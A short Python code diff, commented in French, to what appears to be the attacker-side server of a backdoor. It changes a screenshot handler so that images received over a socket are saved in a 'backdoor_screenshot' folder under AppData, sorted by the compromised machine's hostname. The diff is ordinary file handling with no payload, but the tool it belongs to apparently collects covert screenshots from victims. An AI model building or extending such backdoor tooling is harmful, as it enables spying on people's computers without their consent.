@@ -18,8 +18,25 @@ class ScreenshotHandler:
 
             file_size = struct.unpack("!I", data)[0]
             filename = self.conn_manager.conn.recv(100).decode().strip()
-
-            save_path = os.path.join(os.path.expanduser("~"), "Downloads", filename)
+            
+            # Extraire le nom du PC à partir du nom du fichier
+            # Format du nom de fichier: ip_hostname_timestamp.png
+            parts = filename.split('_')
+            if len(parts) >= 2:
+                pc_name = parts[1]  # Le hostname est la deuxième partie
+            else:
+                pc_name = "unknown"
+            
+            # Créer les dossiers dans AppData/Roaming
+            appdata_path = os.path.join(os.getenv('APPDATA'), "backdoor_screenshot")
+            if not os.path.exists(appdata_path):
+                os.makedirs(appdata_path)
+                
+            pc_folder = os.path.join(appdata_path, pc_name)
+            if not os.path.exists(pc_folder):
+                os.makedirs(pc_folder)
+                
+            save_path = os.path.join(pc_folder, filename)
 
             received_bytes = 0
             with open(save_path, "wb") as file:
@@ -30,6 +47,6 @@ class ScreenshotHandler:
                     file.write(chunk)
                     received_bytes += len(chunk)
 
-            return f"[+] Screenshot reçu: {save_path}" if received_bytes == file_size else "[!] Erreur: Fichier incomplet reçu."
+            return f"[+] Screenshot enregistré dans: {save_path}" if received_bytes == file_size else "[!] Erreur: Fichier incomplet reçu."
         except Exception as e:
             return f"[!] Erreur lors de la réception: {str(e)}"
